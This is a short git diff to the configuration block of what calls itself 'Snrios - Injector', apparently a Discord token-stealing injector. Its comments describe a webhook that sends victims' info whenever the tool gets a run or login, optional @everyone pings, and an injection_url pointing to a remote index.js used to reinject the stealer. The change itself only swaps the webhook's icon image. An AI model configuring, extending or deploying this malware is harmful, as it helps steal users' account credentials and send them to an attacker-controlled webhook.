@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: '$ Snrios - Injector $', //name of the webhook thats gonna send the info
-  embed_icon: 'https://raw.githubusercontent.com/mehwenarweoasdaawd/mehwenarweoasdaawd/main/Snrios.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://raw.githubusercontent.com/mehwenarweoasdaawd/mehwenarweoasdaawd/main/dragon.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 13052629, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/mehwenarweoasdaawd/mehwenarweoasdaawd/main/index.js', //injection url for when it reinjects
   /**
